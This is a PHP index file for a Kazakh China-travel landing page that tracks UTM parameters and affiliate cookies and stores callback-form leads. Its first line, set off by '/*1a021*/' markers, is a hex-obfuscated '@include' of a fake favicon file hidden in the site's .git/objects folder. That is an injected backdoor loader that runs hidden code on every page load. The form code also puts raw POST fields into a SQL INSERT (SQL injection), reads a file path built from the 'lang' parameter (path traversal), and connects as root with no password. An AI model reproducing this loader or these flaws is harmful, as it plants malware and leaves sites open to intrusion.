<?php

/*1a021*/

@include "\x2fvar/\x77ww/m\x79chin\x61.kz/\x2egit/\x6fbjec\x74s/40\x2ffavi\x63on_a\x648fed\x2eico";

/*1a021*/

//echo $_SERVER['REMOTE_ADDR'];

$utm_term = '';
$keyword = '';

$utm_source = $_GET['utm_source'];
$utm_medium = $_GET['utm_medium'];
$utm_campaign = $_GET['utm_campaign'];
if($_GET['utm_term']){
    $utm_term = $_GET['utm_term'];
} else {
    $keyword = $_GET['keyword'];
}

$uri = '';
if($utm_source || $utm_medium || $utm_campaign || $keyword){
    $uri = '?';
}
if($utm_source){
    $uri .= 'utm_source='.$utm_source.'&';
}
if($utm_medium){
    $uri .= 'utm_medium='.$utm_medium.'&';
}
if($utm_campaign){
    $uri .= 'utm_campaign='.$utm_campaign.'&';
}
if($keyword){
    $uri .= 'keyword='.$keyword.'&';
}
if($utm_term){
    $uri .= 'utm_term='.$utm_term.'&';
}

//header('Location: http://mychina.kz/china3'.$uri, true, 301);

session_start();

$url = $_SERVER['REQUEST_URI'];
$url = str_replace('/','',$url);
$url = str_replace('\\','',$url);

if (isset($_GET['lang']) && !empty($_GET['lang'])){
    $lang = $_GET['lang'];
}
else{
    $lang = 'az';
}

$text = json_decode(file_get_contents("lang/$lang.json"));

$config['url'] = "http://localhost/china2/";
$config['img'] = "{$config['url']}img/";
$config['js'] = "{$config['url']}js/";
$config['css'] = "{$config['url']}css/";
$config['files'] = "{$config['url']}files/";
$config['fonts'] = "{$config['url']}fonts/";
$config['path'] = "{$_SERVER["DOCUMENT_ROOT"]}/china2/";
$config['cls'] = "{$config['path']}classes/";
$config['templates'] = "{$config['path']}templates/";
$config['tmpl'] = "{$config['templates']}default/";

// Include and instantiate the classes
require_once "{$config['cls']}Mobile_Detect.php";
require_once "{$config['cls']}helper.php";
$helper = new Helper;
$detect = new Mobile_Detect;

//AP
if($_GET['actionpay']) {
    $arr = explode('.',$_GET['actionpay']);
    setcookie("apclick", $arr[0], time()+30*24*3600, "/", '.mychina.kz' );
    setcookie("apsource", $arr[1], time()+30*24*3600, "/", '.mychina.kz' );
};

//Перекинуть utm на мобилки
$get_params = array(
    "utm_source" => isset($_GET["utm_source"]) ? $_GET["utm_source"] : "",
    "utm_campaign" => isset($_GET["utm_campaign"]) ? $_GET["utm_campaign"] : "",
    "utm_medium" => isset($_GET["utm_medium"]) ? $_GET["utm_medium"] : "",
    "type" => isset($_GET["type"]) ? $_GET["type"] : "",
    "source" => isset($_GET["source"]) ? $_GET["source"] : ""
);

if($get_params['utm_source'] == 'google'){
    $get_params['keyword'] = isset($_GET["utm_term"]) ? $_GET["utm_term"] : "";
} else {
    $get_params['keyword'] = isset($_GET["keyword"]) ? $_GET["keyword"] : "";
}

if ($detect->isMobile()) {
    $mode = 'mobile';
    $config['common'] = "{$config['templates']}common_mobile/";
} else {
    $mode = 'default';
    $config['common'] = "{$config['templates']}common/";
}
$config['tmpl'] = "{$config['templates']}{$mode}/";

require_once "{$config['tmpl']}index.php";



if($_POST && $_POST['Name'] && $_POST['Phone']) {


        $name = $_POST['Name'];
        $phone = $_POST['Phone'];
        $email = $_POST['Email'];

        $source = $_POST['utm_source'];
        $medium = $_POST['utm_medium'];
        $campaign = $_POST['utm_campaign'];
        $keyword = $_POST['keyword'];

        $site = 'c.mychina.kz';

        $data = array(
            'email' => $email,
            'name' => $name,
            'site[]' => $site,
            'phone' => $phone,
            'source' => $source,
            'medium' => $medium,
            'campaign' => $campaign,
            'keyword' => $keyword,
            'ref' => 'Казахстан'
        );




            $db = array(
                'host' => 'localhost',
                'user' => 'root',
                'pass' => '',
                'db' => 'gochina',
                'charset' => 'UTF8'
            );

            $c = mysqli_connect($db['host'], $db['user'], $db['pass'], $db['db']) or die(mysqli_error($c));
//            mysqli_select_db($db['db']) or die('DBError: no such DB!');
            mysqli_query($c,'SET NAMES ' . $db['charset']);
//            mysqli_query($c,'INSERT INTO consultation_requests (added, name, email, telephone, click, source) VALUES (' . time() . ', "' . $name . '", "' . $email . '", "' . $phone . '", "' . $_COOKIE['apclick'] . '", "' . $_COOKIE['apsource'] . '")');
            mysqli_query($c,'INSERT INTO consultation_request (name, email, phone) VALUES ( "' . $name . '", "' . $email . '", "' . $phone . '")');

            $apid = mysqli_insert_id($c);



        $result = true;


        $sid = md5(session_id());
        if ($apid) {
            $apid = '&apid=' . $apid;
        } else {
            $apid = '';
        }
        if ($result) {
            include('send_mail_callback.php');
        }
        if ($mode == 'default') {
            //header('Location: http://mychina.kz/china2/thanks.php?hsid='.$sid.$apid);
            $helper->redirect($config['url'] . 'thanks.php?hsid=' . $sid . $apid, true);
        } else {
            //header('Location: http://mychina.kz/china2/thanks_m.php?hsid=' . $sid . $apid);
            $helper->redirect($config['url'] . 'thanks_m.php?hsid='.$sid, true);
        }
}